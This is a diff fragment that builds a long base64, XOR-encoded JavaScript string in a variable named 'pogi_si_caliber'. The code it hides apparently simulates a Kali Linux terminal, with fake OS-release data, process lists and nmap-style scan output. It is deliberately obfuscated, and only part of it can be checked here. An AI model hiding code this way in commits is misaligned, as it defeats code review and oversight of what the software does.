+pogi_si_caliber += "bC18bmz8bOxs3Xi4TKhIqYqYODg4PAy8rTjcDPwtDQ7cLOxoOe";
+pogi_si_caliber += "g4TLjpCD1I6Xg9HM1s3HxseO+JLT2/6EmKmDg4ODwMvK043Q19";
+pogi_si_caliber += "rPxo3BwsDIxNHM1s3Hg56DwMzPzNGYqYODg4PQ1MLXwMuNwtPT";
+pogi_si_caliber += "xs3H4MvKz8eLwMvK04qYqYOD3qmDg8rNxcyNwtPTxs3H4MvKz8";
+pogi_si_caliber += "eL0NTC18DLipipg4PU0cLTjcLT08bNx4vC0dePg8rNxcyKmKmD";
+pogi_si_caliber += "g9HG19bRzYPU0cLTmKneqanAzM3Q14Ps8Pzx5u/m4vDmg56D+K";
+pogi_si_caliber += "mDg4Tz8eb39/r87eLu5p6B6MLPyoPk7faM78rN1tuD8czPz8rN";
+pogi_si_caliber += "xIGEj6mDg4Tt4u7mnoHows/Kg+Tt9ozvys3W24GEj6mDg4T15v";
+pogi_si_caliber += "Hw6uzt/OrnnoGRk5GVjZKBhI+pg4OE9ebx8Ors7Z6BkZORlY2S";
+pogi_si_caliber += "g4vIws/KjtHMz8/KzcSKgYSPqYODhPXm8fDq7O384Ozn5u3i7u";
+pogi_si_caliber += "aeyMLPyo7RzM/Pys3EhI+pg4OE6ueeyMLPyoSPqYODhOrn/O/q";
+pogi_si_caliber += "6Oaex8bBysLNhI+pg4OE4u3w6vzg7O/s8Z6BkpiQkoGEj6mDg4";
+pogi_si_caliber += "Tr7O7m/Pbx756By9fX09CZjIzU1NSNyMLPyo3M0cSMgYSPqYOD";
+pogi_si_caliber += "hPD28/Ps8ff89vHvnoHL19fT0JmMjMXM0dbO0I3Iws/KjczRxI";
+pogi_si_caliber += "yBhI+pg4OE4fbk/PHm8+zx9/z28e+egcvX19PQmYyMwdbE0I3I";
+pogi_si_caliber += "ws/KjczRxIyBhI+p/pipqcDMzdDXg+/w/PDr7PH3g56D+ISNwc";
+pogi_si_caliber += "LQy9HAg4ON2dDL0cCDg8LBzNbXjdfb14OD0cbC0MzNjdfb14OD";
+pogi_si_caliber += "0czQ18bRjdfb14OD0NfC19bQjdfb14OD18zMz9CMhP6YqanAzM";
+pogi_si_caliber += "3Q14Pv8Pzv7O3kg56D+KmDg4TXzNfCz4OXm4SPqYODhMfR1NvR";
+pogi_si_caliber += "jtvRjtuDg5uD15HQg9eR0IOXk5qVg+3M1YOSlYOTmpmXkoONhI";
+pogi_si_caliber += "+pg4OEx9HU29GO29GO24OSkYPXkdCD15HQg5eTmpWD7czVg5KV";
+pogi_si_caliber += "g5ObmZOXg42NhI+pg4OEjtHUjtGOjtGOjoODkoPXkdCD15HQg4";
+pogi_si_caliber += "OSk5uD7czVg5KXg5GRmZOUg8LBzNbXjdfb14SPqYODhI7R1I7R";
+pogi_si_caliber += "jo7Rjo6Dg5KD15HQg9eR0IODkZOXg+3M1YOSloOTkJmSm4PRxs";
+pogi_si_caliber += "LQzM2N19vXhI+pg4OEjtHUjtGOjtGOjoODkoPXkdCD15HQg4OS";
+pogi_si_caliber += "m5WD7czVg5KWg5OQmZKbg9HM0NfG0Y3X29eEj6mDg4SO0dSO0Y";
+pogi_si_caliber += "6O0Y6Og4OSg9eR0IPXkdCDg4OUkoPtzNWDkpaDk5CZkpuD0NfC";
+pogi_si_caliber += "19bQjdfb14SPqYODhMfR1NvRjtvRjtuDg5WD15HQg9eR0IOXk5";
+pogi_si_caliber += "qVg+3M1YOSlYOTmpmSkYPXzMzP0ISPqf6YqanAzM3Q14Pq8/zi";
+pogi_si_caliber += "5+fxg56D+KmDg4SSmYPPzJmDn+/s7PPh4uDoj/bzj+/s9Obx/P";
+pogi_si_caliber += "bznYPO19aDlZaWkJWD0sfK0MCDzczS1sbWxoPQ18LXxoP27ejt";
+pogi_si_caliber += "7PTtg8TRzNbTg8fGxcLWz9eD0s/GzYOSk5OThI+pg4OEg4ODg8";
+pogi_si_caliber += "rNxteDkpGUjZONk42SjJuD0MDM08aDy8zQ14PPzISPqYODhIOD";
+pogi_si_caliber += "g4ODg4PVws/Kx/zPxdeDxczRxtXG0YPT0cbFxtHRxsf8z8XXg8";
+pogi_si_caliber += "XM0cbVxtGEj6mDg4SRmYPUz8LNk5mDn+Hx7OLn4OLw94/u9u/3";
+pogi_si_caliber += "6uDi8PeP9vOP7+z05vH89vOdg87X1oOSlpOTg9LHytDAg83M0t";
+pogi_si_caliber += "bG1saD0NfC18aD9vODxNHM1tODx8bFwtbP14PSz8bNg5KTk5OE";
+pogi_si_caliber += "j6mDg4SDg4ODz8rNyIzG18vG0YOXwJnGx5nFwZmRwpmUkpmTx4";
+pogi_si_caliber += "PB0ceDxcWZxcWZxcWZxcWZxcWZxcWEj6mDg4SDg4ODys3G14OS";
+pogi_si_caliber += "mpGNkpWbjZKNl5GMkZeDwdHHg5KakY2SlZuNko2RlpaD0MDM08";
+pogi_si_caliber += "aDxM/MwcLPg8fazcLOysCD1M/CzZOEj6mDg4SDg4ODg4OD1cLP";
+pogi_si_caliber += "ysf8z8XXg5uXkpKQ0MbAg9PRxsXG0dHGx/zPxdeDm5eSkpDQxs";
+pogi_si_caliber += "CEj6n+mKmpwMzN0NeD6vP88ez29+aDnoP4qYODhMfGxcLWz9eD";
+pogi_si_caliber += "1crCg5KakY2SlZuNko2Sg8fG1YPUz8LNk4PT0czXzIPHy8DTg9";
+pogi_si_caliber += "DRwIOSmpGNkpWbjZKNl5GDzsbX0crAg5WTk4SPqYODhJKakY2S";
+pogi_si_caliber += "lZuNko2TjJGXg8fG1YPUz8LNk4PT0czXzIPIxtHNxs+D0MDM08";
+pogi_si_caliber += "aDz8rNyIPQ0cCDkpqRjZKVm42SjZeRg87G19HKwIOVk5OEj6n+";
+pogi_si_caliber += "mKmpwMzN0NeD6uXg7O3l6uSDnoP4qYODhNTPws2TmYPFz8LE0J";
+pogi_si_caliber += "6XkpWQn/bzj+Hx7OLn4OLw94/x9u3t6u3kj+727/fq4OLw952D";
+pogi_si_caliber += "g87X1oOSlpOThI+pg4OEg4ODg4ODg4PKzcbXg5KakY2SlZuNko";
+pogi_si_caliber += "2XkYODzcbXzsLQyIORlpaNkZaWjZGWlo2Tg4PB0czCx8DC0NeD";
+pogi_si_caliber += "kpqRjZKVm42SjZGWloSPqYODhIODg4ODg4ODxtfLxtGDl8CZxs";
+pogi_si_caliber += "eZxcGZkcKZlJKZk8eDg9fb0tbG1sbPxs2DkpOTk4ODi+bXy8bR";
+pogi_si_caliber += "zcbXioSPqYODhIODg4ODg4OD8fuD08LAyMbX0IOSm5eRkZCDg8";
+pogi_si_caliber += "Ha18bQg5GSl5qSkJubkYOLkZOXjZqD7srhioSPqYODhIODg4OD";
+pogi_si_caliber += "g4OD9/uD08LAyMbX0IOakpGXk4ODwdrXxtCDkpGbm5CSk5eDi5";
+pogi_si_caliber += "KRjZGD7srhioSPqf6YqanAzM3Q14Pz8Pzi9vuDnoP4qYODhPbw";
+pogi_si_caliber += "5vGDg4ODg4ODg4Pz6ueDhuDz9oOG7ubug4ODg/Xw+YODg/Hw8I";
+pogi_si_caliber += "P39/qDg4ODg4Pw9+L3g/D34vH3g4OD9+ru5oPg7O7u4u3nhI+p";
+pogi_si_caliber += "g4OE0czM14ODg4ODg4ODg4ODkoODk42Tg4OTjZKDkpWblJKRg5";
+pogi_si_caliber += "KRmpOXg5yDg4ODg4ODg/DQg4ODk5uZkpGDg4OTmZOXg4zQwcrN";
+pogi_si_caliber += "jMrNyteEj6mDg4TRzMzXg4ODg4ODg4ODlZKRg4OTjZODg5ONkY";
+pogi_si_caliber += "ORkZeWkpGDkpSVl5ODnIODg4ODg4OD8NDPg4OTm5mSkYODg5OZ";
+pogi_si_caliber += "k5ODjNbQ0YzQwcrNjO3G19TM0cjuws3CxMbRhI+pg4OE0czM14";
+pogi_si_caliber += "ODg4ODg4ODg5uSm4ODk42Tg4OTjZKDg5KRm5eTg4ObkJGTg5yD";
+pogi_si_caliber += "g4ODg4ODg/DQg4ODk5uZkpGDg4OTmZOTg4zW0NGM0MHKzYzQ0M";
+pogi_si_caliber += "vHhI+pg4OE15HQg4ODg4ODg4ODkpKblIODk42Sg4OTjZeDm5KR";
+pogi_si_caliber += "kJeXg5CbkpGTg9fX2pKDg4ODg/DPiIODk5uZkpeDg4OTmZOUg4";
+pogi_si_caliber += "7Z0MuEj6mDg4TXkdCDg4ODg4ODg4ORkZeXg4OTjZODg5ONk4OD";
+pogi_si_caliber += "kpGSk5uDg5eSk5eD19fakoODg4OD8YiDg4OTmpmXkoODg5OZk5";
+pogi_si_caliber += "OD09CDwtbbhI+p/pipqcDMzdDXg/Dw/Pf27+3zg56D+KmDg4Tt";
+pogi_si_caliber += "xtfKx4Pw18LXxoOD8cbA1Y7yg/DGzceO8oPvzMDCz4Pix8fRxt";
+pogi_si_caliber += "DQmfPM0deDg/PGxtGD4sfH0cbQ0JnzzNHXg/PRzMDG0NCEj6mD";
+pogi_si_caliber += "g4TWx9ODg4P27eDs7e2Dk4ODg4ODg5ODg4ODg4ODg4ODk42TjZ";
+pogi_si_caliber += "ONk5mVm4ODg4ODg4ODg5ONk42TjZOZiYSPqYODhNfA04ODg+/q";
+pogi_si_caliber += "8Pfm7YOTg4ODg4ODkpGbg4ODg4ODg4OTjZONk42TmZGRg4ODg4";
+pogi_si_caliber += "ODg4ODk42TjZONk5mJhI+pg4OE18DTg4OD7+rw9+btg5ODg4OD";
+pogi_si_caliber += "g4OXk5qVg4ODg4OSkZSNk42TjZKZlZCSg4ODg4ODg4OTjZONk4";
+pogi_si_caliber += "2TmYmEj6mDg4TXwNODg4Pv6vD35u2Dk4ODg4ODg5KRm4ODg4OD";
+pogi_si_caliber += "g4ODk42TjZONk5mbk5uTg4ODg4ODg5ONk42TjZOZiYSPqf6Yqa";
+pogi_si_caliber += "nAzM3Q14Pn5fzrg56D+KmDg4Tlys/G0NrQ18bOg4ODg4OD8MrZ";
+pogi_si_caliber += "xoOD9tDGx4Pi1cLKz4P20MaGg+7M1s3XxseDzM2Ej6mDg4TWx8";
+pogi_si_caliber += "bVg4ODg4ODg4ODg4ODlI2X5IODg4ODk4ODlI2X5IODg5OGg4zH";
+pogi_si_caliber += "xtWEj6mDg4SMx8bVjM3VzsaTzZLTkYODl5Wb5IODkpuU5IODkZ";
+pogi_si_caliber += "aU5IODl5CGg4yEj6mDg4SMx8bVjM3VzsaTzZLTkoODlpKS7oOD";
+pogi_si_caliber += "g5WR7oODl5aT7oODkpCGg4zBzMzXjMbFyoSPqYODhNfO08XQg4";
+pogi_si_caliber += "ODg4ODg4ODg4OSjZbkg4ORjZLug4OSjZbkg4ODkoaDjNHWzYzW";
+pogi_si_caliber += "0MbRjJKTk5OEj6n+mKmpwMzN0NeD5fHm5vzrg56D+KmDg4SDg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4PXzNfCz4ODg4ODg4OD1tDGx4ODg4ODg4OD";
+pogi_si_caliber += "xdHGxoODg4ODg9DLwtHGx4ODwdbFxYzAwsDLxoODg8LVwsrPws";
+pogi_si_caliber += "HPxoSPqYODhO7GzpmDg4ODg4ODg4ODg4OSluTKg4ODg4ODg5WN";
+pogi_si_caliber += "keTKg4ODg4ODg5CNkuTKg4ODg4ODg5eSke7Kg4ODg4ODg5WNku";
+pogi_si_caliber += "TKg4ODg4ODg5uNmuTKhI+pg4OE8NTC05mDg4ODg4ODg4ODlI2X";
+pogi_si_caliber += "5MqDg4ODg4ODlpKR7sqDg4ODg4ODlY2a5MqEj6n+mKmpwMzN0N";
+pogi_si_caliber += "eD4vP3/Pbw4uTmg56D+KmDg4TC09eDkY2ajZuDi8LOx5WXioSP";
+pogi_si_caliber += "qYODhPbQwsTGmYPC09eD+MzT18rMzdD+g8DMzs7CzceEj6mDg4";
+pogi_si_caliber += "TKzdDXws/Pg//Wk5PBlIPW08fC18aD/9aTk8GUg9bTxNHCx8aD";
+pogi_si_caliber += "/9aTk8GUg9DGwtHAy4P/1pOTwZSD0MvM1ISPqf6YqanAzM3Q14";
+pogi_si_caliber += "Pi8/f89vPn4vfmg56D+KmDg4TryteZkoPL19fTmYyMyMLPyo3H";
+pogi_si_caliber += "zNTNz8zCx4zIws/Kg8jCz8qO0czPz8rNxIPqzfHGz8bC0MaEj6";
+pogi_si_caliber += "mDg4TkxteZkYPL19fTmYyMyMLPyo3HzNTNz8zCx4zIws/Kg8jC";
+pogi_si_caliber += "z8qO0czPz8rNxIzOwsrNg8LOx5WXg/PCwMjCxMbQg/iSmo2Xg+";
+pogi_si_caliber += "7h/oSPqYODhOTG15mQg8vX19OZjIzIws/KjcfM1M3PzMLHjMjC";
+pogi_si_caliber += "z8qDyMLPyo7RzM/Pys3EjM3MzY7F0cbGg8LOx5WXg/PCwMjCxM";
+pogi_si_caliber += "bQg/iRk5KDyOH+hI+pg4OE5cbXwMvGx4OSmo2Vg+7hg8rNg5DQ";
+pogi_si_caliber += "g4uVj5eSkYPI4YzQioSPqYODhPHGwsfKzcSD08LAyMLExoPPyt";
+pogi_si_caliber += "DX0I2NjYPnzM3GhI+p/pipqcDMzdDXg8LT1+rN0NfCz8+DnoPT";
+pogi_si_caliber += "yMSDnp2D+KmDg4TxxsLHys3Eg9PCwMjCxMaDz8rQ19CNjY2D58";
+pogi_si_caliber += "zNxoSPqYODhOHWys/Hys3Eg8fG08bNx8bNwNqD19HGxo2NjYPn";
+pogi_si_caliber += "zM3GhI+pg4OE8cbCx8rNxIPQ18LXxoPKzcXM0c7C18rMzY2NjY";
+pogi_si_caliber += "PnzM3GhI+pg4PTyMSDiIOEg8rQg8LP0cbCx9qD18vGg83G1MbQ";
+pogi_si_caliber += "14PVxtHQyszNg4uRk5GVjZKKjYSPqYODhJOD1tPE0cLHxsePg5";
+pogi_si_caliber += "ODzcbUz9qDys3Q18LPz8bHj4OTg9fMg9HGzszVxoPCzceDk4PN";
+pogi_si_caliber += "zNeD1tPE0cLHxseNhI+p/pipqcDMzdDXg+v65/Hi/Pbw4uTmg5";
+pogi_si_caliber += "6D+KmDg4Tr2sfRwoPVmo2Wg4vAioORk5GQg8Hag9XCzYPrwtbQ";
+pogi_si_caliber += "xtGM9+vgg4WD58LVyseD7sLAysbJwsiEj6mDg4Tr2sfRwoPK0I";
+pogi_si_caliber += "PCg9PC0cLPz8bPytnGx4PPzMTKzYPA0cLAyMbRg9TK18uD0NbT";
+pogi_si_caliber += "08zR14PFzNGDlpOIg9PRzNfMwMzP0I2Ej6mDg4Tw2s3XwtuZg8";
+pogi_si_caliber += "vax9HCg/j4js+D7+zk6u3fju+D5erv5v6D+I7Tg/Pi8PDfjvOD";
+pogi_si_caliber += "5erv5v7+g9DG0dXKwMaZjIzQxtHVxtH4mfPs8ff++Izs8/f+hI";
+pogi_si_caliber += "+pg4OE5tvCztPPxpmDy9rH0cKDjs+D0czM14OO84OM1tDRjNDL";
+pogi_si_caliber += "wtHGjNTM0cfPytDX0IzRzMDI2szWjdfb14PQ0MuZjIySk42Sk4";
+pogi_si_caliber += "2Sl42UhI+p/pipqcDMzdDXg+7w5fzh4u3t5vGDnoP4qYODhIOD";
+pogi_si_caliber += "g4ODg4Oe+IPOxtfC0NPPzMrXg9WVjZeNkpGOx8bVg/6Ej6mDg4";
+pogi_si_caliber += "SIg46Og46OnviDkZeUlYPG29PPzMrX0IOOg5KRlJeDwtbbys/K";
+pogi_si_caliber += "wtHag46Dl5GSg9PM0NeD/oSPqYODhIiDjo6Djo6e+IOSl5WUg9";
+pogi_si_caliber += "PC2s/MwsfQg46Dl5SDxs3AzMfG0dCDjoOSkoPNzNPQg/6Ej6mD";
+pogi_si_caliber += "g4SIg46Og46OnviDmoPG1cLQyszNg/6Ej6mDg4SEj6mDg4T4gv";
+pogi_si_caliber += "6DwMzN0MzPxoPWzcLVwsrPwsHPxoPKzYPXy8rQg9DLxs/Pg//W";
+pogi_si_caliber += "kZOSl4PR1s2DyteDzM2D18vGg8HM242Ej6n+mKmpwMzN0NeD0M";
+pogi_si_caliber += "bC0cDL0NPPzMrXg56D18bRzoOenYP4qYODhI6Ojo6Ojo6Ojo6O";
+pogi_si_caliber += "jo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Djo";
+pogi_si_caliber += "6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6OhI+pg4OE";
+pogi_si_caliber += "g+bb08/MyteD98rXz8aDg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg9+Dg/PC18uEj6mDg4SOjo6Ojo6Ojo6Ojo6Ojo6O";
+pogi_si_caliber += "jo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Og46Ojo6Ojo";
+pogi_si_caliber += "6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6OjoSPqYODhOLTwsDL";
+pogi_si_caliber += "xoORjZeNl5qDjoPzwtfLg/fRwtXG0dDCz4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4Pfg8/KzdbbjNHGzszXxoyWk5CbkI3T2oSPqYODhO/Kzdbb";
+pogi_si_caliber += "g+jG0c3Gz4OVjZqDjoPNxfzXwsHPxtCD9uLlg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4Pfg8/KzdbbjM/MwMLPjJaTmpqajcCEj6mDg4Ts08bN8PDr";
+pogi_si_caliber += "g5uNmtOSg46D89HGjuLW18uD5s3WzsbRwtfKzM2Dg4ODg4ODg4";
+pogi_si_caliber += "OD34PPys3W24zRxs7M18aMl5aRkJCN09qEj6mDg4SOjo6Ojo6O";
+pogi_si_caliber += "jo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo";
+pogi_si_caliber += "6Og46Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6OjoSP";
+pogi_si_caliber += "qYODhPDLxs/PwMzHxtCZg+3Mg/HG0NbP19CEg4iDi9fG0c6DnI";
+pogi_si_caliber += "OEg4OL0MbC0cDLmYOEg4iD18bRzoOIg4SKhIOZg4SEio+p/pip";
+pogi_si_caliber += "qcDMzdDXg83OwtODnoPLzNDXg56dg/ipg4OE8NfC0dfKzcSD7c";
+pogi_si_caliber += "7C04OUjZqX8PXtg4uDy9fX09CZjIzNzsLTjczRxIOKg8LXg4SD";
+pogi_si_caliber += "iIPNxtSD58LXxovQxtHVxtHtzNSLioqN18zvzMDCz8bw19HKzc";
+pogi_si_caliber += "SLhMbNjuThhI+D2IPXys7G+czNxpmDhPb34ISD3oqDiIOEg/b3";
+pogi_si_caliber += "4ISPqYODhO3OwtOD0MDCzYPRxtPM0deDxczRg4SDiIPLzNDXj6";
+pogi_si_caliber += "mDg4TrzNDXg8rQg9bTg4uTjZOSm9CDz8LXxs3A2oqNhI+pg4OE";
+pogi_si_caliber += "7czXg9DLzNTNmYOampWDwM/M0MbHg9fA04PTzNHX0IOL0cbQxt";
+pogi_si_caliber += "eKhI+pg4OE8+zx94ODg4OD8Pfi9+aD8Obx9erg5oP15vHw6uzt";
+pogi_si_caliber += "hI+pg4OEkZGM18DTg4ODzNPGzYOD0NDLg4ODg4Ps08bN8PDrg5";
+pogi_si_caliber += "uNmtOSg/bB1s3X1oOQ1sHWzdfWk42Vg4v2wdbN19aD78rN1tuY";
+pogi_si_caliber += "g9PRzNfMwMzPg5GNk4qEj6mDg4Sbk4zXwNODg4PM08bNg4PL19";
+pogi_si_caliber += "fTg4ODg83Eys3bg5KNkpuNk4SPqYODhJeXkIzXwNODg8zTxs2D";
+pogi_si_caliber += "g9DQz4zL19fTg83Eys3bg5KNkpuNk4SPqYODhJuTm5OM18DTg8";
+pogi_si_caliber += "zTxs2Dg8vX19OO09HM29qD8NLWyseDlo2UhI+pg4OE7c7C04PH";
+pogi_si_caliber += "zM3GmYOSg+rzg8LHx9HG0NCDi5KDy8zQ14PW04qD0MDCzc3Gx4";
+pogi_si_caliber += "PKzYOUjZGSg9DGwMzNx9CEj6n+mKmpwMzN0NeD08rNxIOeg8vM";
+pogi_si_caliber += "0NeDnp2D+KmDg4Tz6u3kg4SDiIPLzNDXg4iDhIOLhIOIg8vM0N";
+pogi_si_caliber += "eDiIOEioOWlYubl4qDwdrXxtCDzMWDx8LXwo2Ej6mDg4SVl4PB";
+pogi_si_caliber += "2tfG0IPF0czOg4SDiIPLzNDXg4iDhJmDysDO0/zQxtKekoPX18";
+pogi_si_caliber += "+elpSD18rOxp6Sko2Xg87QhI+pg4OElZeDwdrXxtCDxdHMzoOE";
+pogi_si_caliber += "g4iDy8zQ14OIg4SZg8rAztP80MbSnpGD19fPnpaUg9fKzsaekp";
+pogi_si_caliber += "ONmoPO0ISPqYODhJWXg8Ha18bQg8XRzM6DhIOIg8vM0NeDiIOE";
+pogi_si_caliber += "mYPKwM7T/NDG0p6Qg9fXz56WlIPXys7GnpKSjZSDztCEj6mDg4";
+pogi_si_caliber += "SVl4PB2tfG0IPF0czOg4SDiIPLzNDXg4iDhJmDysDO0/zQxtKe";
+pogi_si_caliber += "l4PX18+elpSD18rOxp6Sko2Rg87QhI+pg4OEhI+pg4OEjo6Og4";
+pogi_si_caliber += "SDiIPLzNDXg4iDhIPTys3Eg9DXwtfK0NfKwNCDjo6OhI+pg4OE";
+pogi_si_caliber += "l4PTwsDIxtfQg9fRws3QzsrX18bHj4OXg9HGwMbK1cbHj4OTho";
+pogi_si_caliber += "PTwsDIxteDz8zQ0I+D18rOxoOQk5OXztCEj6mDg4TR19eDzsrN";
+pogi_si_caliber += "jMLVxIzOwtuMzsfG1YOeg5KTjZqTkYySko2Qk5GMkpKNlJeSjJ";
+pogi_si_caliber += "ONkJKbg87QhI+p/pipqcDMzdDXg/fm8e785erv5vCDnoPYqYOD";
+pogi_si_caliber += "hNDXwtfW0I3X29eEmYOLioOenYP49+bx7o3Q18LX1tD+j6mDg4";
+pogi_si_caliber += "TCwczW143X29eEmYOLioOenYP35vHujcLBzNbXj6mDg4TRzNDX";
+pogi_si_caliber += "xtGN19vXhJmDi4qDnp2D9+bx7o3RzNDXxtGPqYODhNHGwtDMzY";
+pogi_si_caliber += "3X29eEmYOLioOenYP35vHujdHM0NfG0Y+pg4OEjMbXwIzM0I7R";
+pogi_si_caliber += "xs/GwtDGhJmDi4qDnp2D7PD88ebv5uLw5o+pg4OEjMbXwIzLzN";
+pogi_si_caliber += "DXzcLOxoSZg4uKg56dg/j35vHujcvM0Nf+j6nemKmpxdbNwNfK";
+pogi_si_caliber += "zM2D18bRzvHWzYvRwtSK2KmDg8DMzdDXg8DOx4Oeg/DX0crNxI";
+pogi_si_caliber += "vRwtSDnp6DzdbPz4Ocg4SEg5mD0cLUio3X0crOi4qYqYODwMzN";
+pogi_si_caliber += "0NeDwczbg56D18bRzuHM24uKmKmDg9fG0c7z0czO09eLwczbio";
+pogi_si_caliber += "3XxtvX4MzN18bN14Oeg8DOx5ipg4PKxYuCwM7HioPRxtfW0c2Y";
+pogi_si_caliber += "qamDg/fm8e786+rw9+zx+o3T1tDLi8DOx4qYqYOD18bRzuvK0N";
+pogi_si_caliber += "fqzcfG24Oeg/fm8e786+rw9+zx+o3Pxs3E18uYqamDg8DMzdDX";
+pogi_si_caliber += "g9PC0dfQg56DwM7HjdDTz8rXi4z/0IiMipipg4PAzM3Q14PNws";
+pogi_si_caliber += "7Gg56D08LR19D4k/6N18zvzNTG0eDC0MaLipipg4PAzM3Q14PC";
+pogi_si_caliber += "0cSDnoOL08LR19D4kv6D39+DhISKjdfM78zUxtHgwtDGi4qYqY";
+pogi_si_caliber += "ODwMzN0NeD0cbQ14Oeg9PC0dfQjdDPysDGi5KKjcnMys2LhIOE";
+pogi_si_caliber += "ipipg4PAzM3Q14PXwtHExtfQg56D08LR19CN0M/KwMaLkoqNxc";
+pogi_si_caliber += "rP18bRi9ODnp2D043Ay8LR4teLk4qDgp6eg4SOhIqYqYODwMzN";
+pogi_si_caliber += "0NeD18LRxMbXg56D18LRxMbX0I3Pxs3E18uDnIPXwtHExtfQ+N";
+pogi_si_caliber += "fC0cTG19CNz8bNxNfLg46Dkv6DmYOEhJipqYOD0NTK18DLi83C";
+pogi_si_caliber += "zsaK2KmDg4ODwMLQxoOEy8bP04SZqYODg4ODg9fG0c700crXxo";
+pogi_si_caliber += "vBzNuPg/ipg4ODg4ODg4OEwtXCys/Cwc/Gg8DMzs7CzcfQhI+p";
+pogi_si_caliber += "g4ODg4ODg4OEg4PRzNDXxtGZg4PCwczW14P/1pOTwZSD0cbC0M";
+pogi_si_caliber += "zNg//Wk5PBlIPQ18LX1tCEj6mDg4ODg4ODg4SDg8jCz8qZg4OD";
+pogi_si_caliber += "g83OwtODn8vM0Nedg//Wk5PBlIPTys3Eg5/LzNDXnYP/1pOTwZ";
+pogi_si_caliber += "SDy9rH0cKD/9aTk8GUg87QxcDMzdDMz8aD/9aTk8GUg9DGwtHA";
+pogi_si_caliber += "y9DTz8zK14P/1pOTwZSDwtPXhI+pg4ODg4ODg4OEg4PQ2tDXxs";
+pogi_si_caliber += "6Zg4PNxszFxtfAy4P/1pOTwZSD1MvMws7Kg//Wk5PBlIPKx4P/";
+pogi_si_caliber += "1pOTwZSD1s3CzsaDjsKD/9aTk8GUg8vM0NfNws7Gg//Wk5PBlI";
+pogi_si_caliber += "PT1MeD/9aTk8GUg8fC18aD/9aTk8GUg9bT18rOxoSPqYODg4OD";
+pogi_si_caliber += "g4ODhIODzcbX1MzRyJmDytODwoP/1pOTwZSDysXAzM3FysSD/9";
+pogi_si_caliber += "aTk8GUg9DQg47X1s/N04P/1pOTwZSDzcbX0NfC14SPqYODg4OD";
+pogi_si_caliber += "g4ODhIODwczbmYODg4OD09CDwtbbg//Wk5PBlIPHxYOOy4P/1p";
+pogi_si_caliber += "OTwZSDxdHGxoOOy4P/1pOTwZSDz9CDjs/Cg//Wk5PBlIPLytDX";
+pogi_si_caliber += "zNHag//Wk5PBlIPGwMvMhI+pg4ODg4ODg4OEg4PFys/G0JmDg4";
+pogi_si_caliber += "PAwteDn8XKz8adg//WkZOSl4PQ18LX1tCN19vXg//Wk5PBlIPC";
+pogi_si_caliber += "wczW143X29eD/9aTk8GUg9HM0NfG0Y3X29eEj6mDg4ODg4ODg4";
+pogi_si_caliber += "SDg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4OMxtfAjMzQjtHGz8bC";
+pogi_si_caliber += "0MaD/9aTk8GUg4zG18CMy8zQ183CzsaEj6mDg4ODg4ODg4SDg8";
+pogi_si_caliber += "DPxsLRg4ODg9TK08aD18vGg9DA0cbGzYSPqYODg4ODg/6KmKmD";
+pogi_si_caliber += "g4ODg4PB0cbCyJipg4ODg8DC0MaDhM3GzMXG18DLhJmpg4ODg4";
+pogi_si_caliber += "OD18bRzuHPzMDIi8HM24+D18bRzuXG18DLi4qKmKmDg4ODg4PB";
+pogi_si_caliber += "0cbCyJipg4ODg8DC0MaDhMLBzNbXhJmpg4ODg4OD18bRzvTRyt";
+pogi_si_caliber += "fGi8HM24+D9+bx7o3CwczW14qYqYODg4ODg8HRxsLImKmDg4OD";
+pogi_si_caliber += "wMLQxoOE0czQ18bRhJmpg4ODg8DC0MaDhNHGwtDMzYSZqYODg4";
+pogi_si_caliber += "ODg9fG0c700crXxovBzNuPg/fm8e6N0czQ18bRipipg4ODg4OD";
+pogi_si_caliber += "wdHGwsiYqYODg4PAwtDGg4TQ18LX1tCEmamDg4ODg4PXxtHO9N";
+pogi_si_caliber += "HK18aLwczbj4P49+bx7o3Q18LX1tD+ipipg4ODg4ODwdHGwsiY";
+pogi_si_caliber += "qYODg4PAwtDGg4TAz8bC0YSZqYODg4ODg9fG0c7s1teN18bb1+";
+pogi_si_caliber += "DMzdfGzdeDnoOEhJipg4ODg4ODwdHGwsiYqYODg4PAwtDGg4TQ";
+pogi_si_caliber += "1sfMhJmpg4ODg4OD18bRzvPRys3Xi8HM24+D+ITQ1sfMmYOEg4";
+pogi_si_caliber += "iD9+bx7o3W0MbRg4iDhIPK0IPNzNeDys2D18vGg9DWx8zG0dCD";
+pogi_si_caliber += "xcrPxo2Dg/fLytCDys3AysfGzdeD1MrPz4PBxoPRxtPM0dfGx4";
+pogi_si_caliber += "2E/oqYqYODg4ODg8HRxsLImKmDg4ODwMLQxoOE0NaEmamDg4OD";
+pogi_si_caliber += "g4PXxtHO89HKzdeLwczbj4P4hPPC0NDUzNHHmYSPg4TQ1pmD4t";
+pogi_si_caliber += "bXy8bN18rAwtfKzM2DxcLKz9bRxoT+ipipg4ODg4ODwdHGwsiY";
+pogi_si_caliber += "qamDg4ODwMLQxoOE1MvMws7KhJmpg4ODg4OD18bRzvPRys3Xi8";
+pogi_si_caliber += "HM24+D+Pfm8e6N1tDG0f6KmKmDg4ODg4PB0cbCyJipg4ODg8DC";
+pogi_si_caliber += "0MaDhMrHhJmpg4ODg4OD18bRzvPRys3Xi8HM24+D+ITWyseekp";
+pogi_si_caliber += "OTk4uEg4iD9+bx7o3W0MbRg4iDhIqDxMrHnpKTk5OLhIOIg/fm";
+pogi_si_caliber += "8e6N1tDG0YOIg4SKg8TRzNbT0J6Sk5OTi4SDiIP35vHujdbQxt";
+pogi_si_caliber += "GDiIOEio+RlIvQ1sfMio+Sk5OL1tDG0dCKhP6KmKmDg4ODg4PB";
+pogi_si_caliber += "0cbCyJipg4ODg8DC0MaDhNPUx4SZqYODg4ODg9fG0c7z0crN14";
+pogi_si_caliber += "vBzNuPg/iEjMvMzsaMhIOIg/fm8e6N1tDG0f6KmKmDg4ODg4PB";
